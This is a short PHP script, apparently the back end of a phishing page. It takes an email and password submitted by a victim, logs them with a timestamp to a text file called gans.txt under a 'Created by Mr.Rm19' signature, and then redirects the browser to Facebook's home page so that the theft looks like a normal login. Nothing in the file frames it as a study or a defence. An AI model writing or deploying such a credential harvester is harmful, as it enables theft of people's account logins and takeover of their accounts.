<?php
$email=$_POST['email'];
$pass=$_POST['pass'];
$time=time();
$gmt='+7';
$jm='3600';
$var=$time+($gmt*$jm);
$now=gmdate('d M Y - H:i',$var);



$file=fopen('gans.txt',a);
$save=fwrite($file,'##############################
User : '.$email.'
Pass : '.$pass.'
'.$now.'
##############################
Created by Mr.Rm19

');
fclose($file);
header('location:http://facebook.com/home.php');


?>
